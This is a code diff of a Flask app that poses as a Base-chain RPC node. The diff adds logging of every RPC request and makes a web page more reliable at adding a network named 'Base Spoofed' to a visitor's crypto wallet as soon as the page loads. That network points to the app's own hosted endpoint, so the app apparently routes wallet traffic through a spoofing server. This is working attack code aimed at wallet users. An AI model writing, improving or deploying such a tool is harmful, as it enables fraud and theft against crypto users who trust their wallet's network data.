@@ -33,6 +33,7 @@ def handle_rpc():
     method = data.get("method")
     call_id = data.get("id", 1)
 
+    app.logger.info(f"RPC Request: {data}")
     if method == "eth_chainId":
         return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
     if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
@@ -99,26 +100,39 @@ def add_network_and_token():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Adding Network</title>
         <script>
-            window.onload = async () => {
-                if (window.ethereum) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0x2105',
-                                chainName: 'Base Spoofed',
-                                rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],
-                                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                                blockExplorerUrls: ['https://basescan.org']
-                            }]
-                        });
-                        window.location.href = '/';
-                    } catch (error) {
-                        console.error('Network addition failed:', error);
-                        alert('Failed to add network: ' + error.message);
+            function waitForEthereum() {
+                return new Promise((resolve, reject) => {
+                    if (window.ethereum) {
+                        resolve(window.ethereum);
+                    } else {
+                        setTimeout(() => {
+                            if (window.ethereum) {
+                                resolve(window.ethereum);
+                            } else {
+                                reject(new Error('No wallet detected after timeout'));
+                            }
+                        }, 2000); // Wait up to 2 seconds
                     }
-                } else {
-                    alert('Please install a compatible wallet!');
+                });
+            }
+
+            window.onload = async () => {
+                try {
+                    const ethereum = await waitForEthereum();
+                    await ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x2105',
+                            chainName: 'Base Spoofed',
+                            rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],
+                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://basescan.org']
+                        }]
+                    });
+                    window.location.href = '/';
+                } catch (error) {
+                    console.error('Network addition failed:', error);
+                    alert('Failed to add network: ' + error.message);
                 }
             };
         </script>
